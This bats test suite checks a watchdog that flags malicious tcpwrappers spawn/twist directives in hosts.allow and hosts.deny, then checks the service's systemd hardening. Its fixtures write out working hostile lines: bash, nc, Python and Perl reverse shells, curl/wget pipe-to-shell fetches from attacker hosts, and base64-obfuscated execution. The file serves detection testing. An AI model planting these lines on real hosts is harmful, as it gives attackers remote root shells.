#!/usr/bin/env bats
# L2 bats functional tests for the hosts-allow-watchdog scan script.
#
# A tcpwrappers rule in /etc/hosts.allow (or hosts.deny) may carry an
# optional `spawn <cmd>` / `twist <cmd>` shell command that runs AS ROOT
# whenever a matching connection arrives — remotely-triggerable root exec
# (T1546). A file that is world-writable / non-root-owned, or a spawn/twist
# command carrying an injection pattern (incl. a writable-root path), is
# alert.
#
# Run with: bats packaging/test/L2-hosts-allow-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd/hosts-allow-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HALLOW="${TMP}/hosts.allow"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_HOSTSALLOW_PROFILE="${PROFILE:-report}" \
    SELFDEF_HOSTSALLOW_BASELINE="${BASELINE}" \
    SELFDEF_HOSTSALLOW_FILES="${FILES_V:-$HALLOW}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf 'sshd: 192.168.1.0/255.255.255.0\nALL: LOCAL\n' > "${HALLOW}"
}

@test "no hosts.allow → ok / no_hosts_allow" {
    FILES_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_hosts_allow"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hosts.allow, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hosts.allow on second run → ok / hosts_allow_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"hosts_allow_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a spawn command with an injection pattern → alert / hosts_allow_suspicious" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"hosts_allow_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a spawn command under a writable root → alert" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn /tmp/.x %%h\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable hosts.allow → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign hosts.allow change → warn / hosts_allow_changed" {
    seed_benign
    run_wd
    printf 'sshd: 10.0.0.0/255.0.0.0\nALL: LOCAL\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"hosts_allow_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign hosts.allow with no spawn/twist is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious spawn command" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — hosts.allow inventory enumerates remote-trigger root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (twist command also fires — symmetric to spawn): twist <evil> → alert" {
    # twist is the sibling of spawn — different semantics (replace
    # connection, run command) but same root-exec attack surface.
    seed_benign
    run_wd
    printf 'ALL: ALL: twist bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in spawn): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn wget -qO- http://attacker/p | sh\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in spawn): obfuscation → alert" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn echo YmFzaCAtaQ== | base64 -d | bash\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (spawn under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn /var/tmp/.x %%h\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (spawn under /dev/shm): tmpfs writable-root coverage" {
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn /dev/shm/.x %%h\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable hosts.allow): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-hosts-allow -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): hosts-allow-watchdog does NOT refresh baseline on suspicious-spawn detection — alert STAYS until operator updates" {
    # T1546 remote-trigger root-exec persistence — alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf 'ALL: ALL: spawn bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HALLOW}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"hosts_allow_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious spawn NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'sshd: 192.168.1.0/255.255.255.0\nALL: LOCAL\n# ALL: ALL: spawn /tmp/.example-attacker\n' > "${HALLOW}"
    run_wd
    ! cap | grep -q '"event":"hosts_allow_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: hosts.allow + hosts.deny axes — suspicious spawn in either → alert)" {
    HDENY="${TMP}/hosts.deny"
    seed_benign
    FILES_V="${HALLOW} ${HDENY}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant spawn in hosts.deny — tcpwrappers honors spawn from both
    # hosts.allow AND hosts.deny.
    printf 'ALL: ALL: spawn /tmp/.evil %%h\n' > "${HDENY}"
    FILES_V="${HALLOW} ${HDENY}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn curl -s http://attacker.com/p | bash\n' > "${HALLOW}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in tcpwrappers spawn: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. The tcpwrappers spawn directive fires
    # AS ROOT (when sshd / vsftpd / inetd-style daemons are running
    # as root and reject a connection) on every matching incoming
    # connection — a recurring trigger fired by REMOTE attackers
    # (not local). Most dangerous of the brain-wide family because
    # the attacker doesn't even need foothold to trigger the
    # callback. Closes the nc reverse-shell sister axis on the
    # remote-trigger root-exec persistence surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn nc -e /bin/sh 1.1.1.1 4444\n' > "${HALLOW}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on tcpwrappers spawn surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the tcpwrappers
    # remote-trigger root-exec persistence surface (T1546 — spawn
    # directive runs AS ROOT on every matching incoming connection
    # — recurring trigger fired by REMOTE attackers without
    # foothold).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HALLOW}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on tcpwrappers spawn surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp tcpwrappers
    # spawn rev-shell variants already locked. Perl is on every
    # Debian/Ubuntu host as dpkg/locale dependency; 'use Socket'
    # produces a one-liner connect-back PTY. Locks the perl axis
    # on the T1546 tcpwrappers remote-trigger root-exec
    # persistence surface — spawn directive runs AS ROOT on every
    # matching connection, fired by REMOTE attackers without
    # foothold.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HALLOW}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HALLOW}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-hosts-allow -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (exec-path under writable-root: tcpwrappers spawn invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # connection-event-trigger root-exec — tcpwrappers spawn=
    # fires AS ROOT on every matching incoming connection
    # (remotely-triggerable). Beyond inline rev-shell payloads,
    # attackers stage benign-looking spawn that invokes binary
    # in writable-root.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'ALL: ALL: spawn /tmp/staged_payload\n' > "${HALLOW}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on hosts-allow surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The hosts-allow-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 connection-event-trigger root-exec
    # persistence alert. Locks parser contract on the hosts.
    # allow/hosts.deny tcpwrappers spawn= detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf 'ALL: ALL: spawn /tmp/.evil\n' > "${HALLOW}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # hosts-allow-watchdog runs ON the timer's scheduled fire —
    # scans /etc/hosts.allow + /etc/hosts.deny for tcpwrappers
    # spawn injection, emits a verdict, then exits. Type=simple
    # would break timer OnUnitActiveSec semantics. Locks oneshot-
    # probe contract on the hosts-allow-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd/selfdef-hosts-allow.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. hosts-allow-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # hosts-allow-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # hosts-allow-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'hosts-allow-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: hosts-allow-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. hosts-allow-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the hosts-allow-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (hosts-allow-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The hosts-allow-watchdog libexec uses set -u to catch typo'd env-var
    # references before they silently propagate as empty
    # strings into baseline-path operations. Locks set -u
    # discipline on the hosts-allow-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (hosts-allow-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # hosts-allow-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (hosts-allow-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # hosts-allow-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (hosts-allow-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the hosts-allow-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (hosts-allow-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # hosts-allow-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (hosts-allow-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the hosts-allow-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (hosts-allow-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the hosts-allow-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (hosts-allow-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # hosts-allow-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (hosts-allow-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the hosts-allow-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (hosts-allow-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the hosts-allow-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (hosts-allow-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the hosts-allow-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (hosts-allow-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the hosts-allow-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (hosts-allow-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the hosts-allow-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}

@test "INVARIANT (hosts-allow-watchdog service unit declares ReadWritePaths= — explicit-strict-mode-permitted-writes manifest contract)" {
    # Sister to brain-wide systemd ReadWritePaths= INVARIANT
    # family. Watchdog .service units run under ProtectSystem=
    # strict which forbids ALL writes to /etc, /usr, /boot —
    # the unit can ONLY write to paths explicitly enumerated
    # in ReadWritePaths=. Watchdog scripts MUST write to at
    # least /dev/log (logger(1) channel) + the canonical
    # selfdef state dir. A regression dropping ReadWritePaths=
    # would surface as EROFS at logger() call. Locks the
    # explicit-allowlist write-paths discipline on the hosts-allow-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ReadWritePaths=' "${s}"
    done
}

@test "INVARIANT (hosts-allow-watchdog service unit ExecStart references /usr/local/libexec/selfdef/ — operator-extension binary-path canonical contract)" {
    # Sister to brain-wide systemd ExecStart binary-path
    # INVARIANT family. Watchdog .service units MUST execute
    # the watchdog script from /usr/local/libexec/selfdef/
    # (operator-extension path, not /usr/bin which is
    # Debian-package-only). The canonical libexec/selfdef/
    # path lets operators override the watchdog script
    # without rebuilding the .deb (sister to brain-wide
    # operator-extension /usr/local/* discipline). A
    # regression that pointed ExecStart at /usr/bin/ would
    # surface as a "stale-watchdog-binary" on hosts where
    # operators patched the libexec copy. Locks the
    # libexec/selfdef ExecStart-path discipline on the
    # hosts-allow-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/hosts-allow-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}
